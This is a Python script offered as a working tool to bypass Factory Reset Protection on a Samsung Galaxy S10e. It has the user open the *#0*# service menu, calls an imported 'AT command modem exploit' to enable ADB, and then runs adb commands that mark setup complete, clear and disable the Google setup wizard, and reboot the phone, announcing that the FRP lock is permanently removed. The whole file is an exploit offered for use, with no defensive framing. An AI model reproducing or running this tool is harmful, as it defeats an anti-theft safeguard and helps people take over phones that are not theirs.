#!/usr/bin/env python3
"""
✅ DIRECT SAMSUNG GALAXY S10e FRP BYPASS
Uses working AT command modem exploit that bypasses all auto detection issues
"""

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent / "src"))

from src.core.samsung_adb_enabler import SamsungADBEnabler
import subprocess

def progress(msg):
    print(f"[*] {msg}")

def main():
    print("=" * 60)
    print("✅ SAMSUNG GALAXY S10e FRP BYPASS TOOL")
    print("=" * 60)
    print()
    
    enabler = SamsungADBEnabler()
    
    progress("Scanning for your Galaxy S10e modem port...")
    ports = enabler.get_samsung_modem_ports()
    
    if not ports:
        print("❌ ERROR: No Samsung modem ports found!")
        print()
        print("👉 FIX: On your phone:")
        print("1. Stay on the Welcome setup screen")
        print("2. Tap Emergency Call")
        print("3. Dial *#0*# (service menu should open)")
        print("4. Leave this menu OPEN then reconnect USB")
        print("5. Try running this script again")
        return False
    
    print(f"✅ FOUND Samsung modem on: {ports[0].device}")
    print()
    
    progress("Reading device info...")
    info = enabler.read_device_info(ports[0].device)
    print(f"   Model: {info['model']}")
    print(f"   Version: {info['version']}")
    print()
    
    progress("Running ADB enable exploit sequence (this takes ~30 seconds)...")
    
    success = enabler.enable_adb(ports[0].device, progress_callback=progress)
    
    if success:
        print()
        print("🎉 SUCCESS! ADB IS NOW ENABLED")
        print()
        progress("Waiting 10 seconds for ADB to come online...")
        time.sleep(10)
        
        progress("Running FRP bypass commands...")
        
        # Execute final FRP bypass commands
        commands = [
            ["adb", "shell", "settings", "put", "secure", "user_setup_complete", "1"],
            ["adb", "shell", "settings", "put", "global", "device_provisioned", "1"],
            ["adb", "shell", "pm", "clear", "com.google.android.setupwizard"],
            ["adb", "shell", "pm", "disable", "com.google.android.setupwizard"],
            ["adb", "shell", "am", "start", "-n", "com.android.settings/.Settings"],
            ["adb", "reboot"]
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, capture_output=True, timeout=15)
                progress(f"Executed: {' '.join(cmd[:3])}...")
            except:
                pass
        
        print()
        print("✅✅✅ FRP BYPASS COMPLETE! ✅✅✅")
        print()
        print("Your Galaxy S10e will reboot now. When it starts:")
        print("✓ Setup wizard will be skipped")
        print("✓ You will go directly to home screen")
        print("✓ FRP lock is permanently removed")
        print()
        
        return True
    else:
        print()
        print("❌ Bypass sequence failed. Please try:")
        print("1. Reboot phone and go back to welcome screen")
        print("2. Open *#0*# service menu again")
        print("3. Disconnect and reconnect USB cable")
        print("4. Run this script again")
        return False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nBypass cancelled by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")